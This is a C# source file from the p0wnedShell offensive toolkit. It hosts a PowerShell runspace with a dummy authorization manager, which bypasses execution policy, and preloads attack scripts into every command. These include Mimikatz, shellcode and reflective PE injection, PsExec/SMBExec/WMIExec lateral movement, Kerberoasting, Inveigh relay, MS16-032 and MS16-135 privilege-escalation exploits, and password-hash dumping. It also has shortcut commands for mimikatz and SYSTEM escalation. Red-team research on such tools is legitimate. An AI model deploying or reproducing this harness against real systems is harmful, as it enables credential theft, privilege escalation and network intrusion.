namespace p0wnedShell
{
    using System;
	using System.IO;
    using System.Collections.Generic;
    using System.Collections.ObjectModel;
    using System.Management.Automation;
    using System.Management.Automation.Host;
    using System.Management.Automation.Runspaces;
    using System.Text;
    using PowerShell = System.Management.Automation.PowerShell;
    
	
    public class P0wnedListenerConsole
    {
        private bool shouldExit;

        private int exitCode;

        private MyHost myHost;
				        
		internal Runspace myRunSpace;

        private PowerShell currentPowerShell;

        private object instanceLock = new object();
		
		public P0wnedListenerConsole()
        {
			
			InitialSessionState state = InitialSessionState.CreateDefault();
            state.AuthorizationManager = new System.Management.Automation.AuthorizationManager("Dummy");
			
			this.myHost = new MyHost(this);
            this.myRunSpace = RunspaceFactory.CreateRunspace(this.myHost, state);
            this.myRunSpace.Open();

            lock (this.instanceLock)
            {
                this.currentPowerShell = PowerShell.Create();
            }

            try
            {
                this.currentPowerShell.Runspace = this.myRunSpace;

                PSCommand[] profileCommands = p0wnedShell.HostUtilities.GetProfileCommands("p0wnedShell");
                foreach (PSCommand command in profileCommands)
                {
                    this.currentPowerShell.Commands = command;
                    this.currentPowerShell.Invoke();
                }
            }
            finally
            {
                lock (this.instanceLock)
                {
                    this.currentPowerShell.Dispose();
                    this.currentPowerShell = null;
                }
            }
        }

        public bool ShouldExit
        {
            get { return this.shouldExit; }
            set { this.shouldExit = value; }
        }

        public int ExitCode
        {
            get { return this.exitCode; }
            set { this.exitCode = value; }
        }

        public void CommandShell()
        {
            CommandPrompt();
        }

        private void executeHelper(string cmd, object input)
        {
            if (String.IsNullOrEmpty(cmd))
            {
                return;
            }

            lock (this.instanceLock)
            {
                this.currentPowerShell = PowerShell.Create();
            }

            try
            {
                this.currentPowerShell.Runspace = this.myRunSpace;
				
				this.currentPowerShell.AddScript(Resources.Invoke_Shellcode());
				this.currentPowerShell.AddScript(Resources.Invoke_Mimikatz());
				this.currentPowerShell.AddScript(Resources.Invoke_ReflectivePEInjection());
				this.currentPowerShell.AddScript(Resources.Invoke_PsExec());
				this.currentPowerShell.AddScript(Resources.Invoke_TokenManipulation());
				this.currentPowerShell.AddScript(Resources.PowerCat());
				this.currentPowerShell.AddScript(Resources.Invoke_Encode());
				this.currentPowerShell.AddScript(Resources.Invoke_PowerView());
				this.currentPowerShell.AddScript(Resources.Invoke_PowerUp());				
				this.currentPowerShell.AddScript(Resources.Get_PassHashes());
                this.currentPowerShell.AddScript(Resources.Get_GPPPassword());
				this.currentPowerShell.AddScript(Resources.Copy_VSS());
				this.currentPowerShell.AddScript(Resources.Port_Scan());
                this.currentPowerShell.AddScript(Resources.Inveigh());
                this.currentPowerShell.AddScript(Resources.Inveigh_relay());
                this.currentPowerShell.AddScript(Resources.Invoke_Tater());
                this.currentPowerShell.AddScript(Resources.Invoke_MS16_032());
                this.currentPowerShell.AddScript(Resources.Invoke_MS16_135());
                this.currentPowerShell.AddScript(Resources.Invoke_Kerberoast());
                this.currentPowerShell.AddScript(Resources.GetUserSPNs());
                this.currentPowerShell.AddScript(Resources.Sherlock());
                this.currentPowerShell.AddScript(Resources.Invoke_SMBExec());
                this.currentPowerShell.AddScript(Resources.Invoke_WMIExec());
                this.currentPowerShell.AddScript(Resources.Invoke_BloodHound());

                this.currentPowerShell.AddScript(cmd);
                this.currentPowerShell.AddCommand("out-default");
                this.currentPowerShell.Commands.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);

                if (input != null)
                {
                    this.currentPowerShell.Invoke(new object[] { input });
                }
                else
                {
                    this.currentPowerShell.Invoke();
                }
            }
            finally
            {
                lock (this.instanceLock)
                {
                    this.currentPowerShell.Dispose();
                    this.currentPowerShell = null;
                }
            }
        }

        private void ReportException(Exception e)
        {
            if (e != null)
            {
                object error;
                IContainsErrorRecord icer = e as IContainsErrorRecord;
                if (icer != null)
                {
                    error = icer.ErrorRecord;
                }
                else
                {
                    error = (object)new ErrorRecord(e, "Host.ReportException", ErrorCategory.NotSpecified, null);
                }

                lock (this.instanceLock)
                {
                    this.currentPowerShell = PowerShell.Create();
                }

                this.currentPowerShell.Runspace = this.myRunSpace;

                try
                {
                    this.currentPowerShell.AddScript("$input").AddCommand("out-string");

                    Collection<PSObject> result;
                    PSDataCollection<object> inputCollection = new PSDataCollection<object>();
                    inputCollection.Add(error);
                    inputCollection.Complete();
                    result = this.currentPowerShell.Invoke(inputCollection);

                    if (result.Count > 0)
                    {
                        string str = result[0].BaseObject as string;
                        if (!string.IsNullOrEmpty(str))
                        { 
                            this.myHost.UI.WriteErrorLine(str.Substring(0, str.Length - 2));
                        }
                    }
                }
                finally
                {
                    lock (this.instanceLock)
                    {
                        this.currentPowerShell.Dispose();
                        this.currentPowerShell = null;
                    }
                }
            }
        }

        public void Execute(string cmd)
        {
            try
            {
                this.executeHelper(cmd, null);
            }
            catch (RuntimeException rte)
            {
                this.ReportException(rte);
            }
        }

        private void HandleControlC(object sender, ConsoleCancelEventArgs e)
        {
            try
            {
                lock (this.instanceLock)
                {
                    if (this.currentPowerShell != null && this.currentPowerShell.InvocationStateInfo.State == PSInvocationState.Running)
                    {
                        this.currentPowerShell.Stop();
                    }
                }

                e.Cancel = true;
            }
            catch (Exception exception)
            {
                this.myHost.UI.WriteErrorLine(exception.ToString());
            }
        }

        private void CommandPrompt()
        {
            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");

            int bufSize = 8192;
			Stream inStream = Console.OpenStandardInput(bufSize);
			Console.SetIn(new StreamReader(inStream, Console.InputEncoding, false, bufSize));
		
            Console.CancelKeyPress += new ConsoleCancelEventHandler(this.HandleControlC);

            if (!ConsoleEx.IsInputRedirected || !ConsoleEx.IsOutputRedirected || !ConsoleEx.IsErrorRedirected)
            {
                Console.TreatControlCAsInput = false;
            }

            while (!this.ShouldExit)
            {
                string prompt;
                if (this.myHost.IsRunspacePushed)
                {
                    prompt = string.Format("\n[{0}]: p0wnedShell> ", this.myRunSpace.ConnectionInfo.ComputerName);
                }
                else
                {
                    prompt = string.Format("\np0wnedShell {0}> ", this.myRunSpace.SessionStateProxy.Path.CurrentFileSystemLocation.Path);
                }

                this.myHost.UI.Write(prompt);
                string cmd = Console.ReadLine();
                if (cmd == "exit" || cmd == "quit")
                {
                    return;
                }
                else if (cmd == "cls")
                {
                    if (!ConsoleEx.IsInputRedirected || !ConsoleEx.IsOutputRedirected || !ConsoleEx.IsErrorRedirected)
                    {
                        Console.Clear();
                    }
                }
                else if (cmd == "mimikatz")
                {
                    if (Arch != "AMD64")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        Execution.MimiShell();
                    }
                }
                else if (cmd == "easysystem")
                {
                    GetSystem.EasySystemPPID();
                }
                else 
				{
					try
					{
						this.Execute(cmd);
					}
					catch (Exception e)
					{
						Console.WriteLine(e.Message);
					}
				}
            }

        }
    }
}

